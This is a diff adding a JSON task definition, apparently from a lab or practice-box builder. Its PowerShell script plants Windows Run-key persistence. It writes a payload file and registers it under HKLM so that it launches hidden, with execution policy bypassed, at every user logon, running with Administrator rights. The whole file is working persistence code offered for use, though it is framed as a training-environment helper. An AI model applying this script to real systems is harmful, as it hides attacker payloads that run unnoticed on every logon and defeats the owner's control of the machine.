@@ -1,0 +1,10 @@
+{
+  "name": "runkey-persistence-win",
+  "description": "Practice-box helper (Windows): plants HKLM Run-key persistence. Writes a PowerShell payload file ($PAYLOAD_PATH/$PAYLOAD_BODY) and a Run value ($RUN_VALUE_NAME) under HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run that launches it hidden at any user logon. Vars: RUN_VALUE_NAME (required); PAYLOAD_PATH (required); PAYLOAD_BODY (optional); ARGUMENTS (optional extra args). Idempotent.",
+  "platform": "windows",
+  "category": "misconfiguration",
+  "type": "powershell",
+  "run_as": "Administrator",
+  "script": "if (-not $RUN_VALUE_NAME -or -not $PAYLOAD_PATH) { throw 'RUN_VALUE_NAME and PAYLOAD_PATH are required' }\n$dir = Split-Path $PAYLOAD_PATH -Parent\nNew-Item -ItemType Directory -Force -Path $dir | Out-Null\nif ($PAYLOAD_BODY) { Set-Content -Path $PAYLOAD_PATH -Value $PAYLOAD_BODY -Encoding ascii }\n$extra = if ($ARGUMENTS) { \" $ARGUMENTS\" } else { '' }\n$cmd = \"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `\"$PAYLOAD_PATH`\"$extra\"\n$k = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', $true)\n$k.SetValue($RUN_VALUE_NAME, $cmd, 'String')\n$k.Close()\n",
+  "depends_on": []
+}
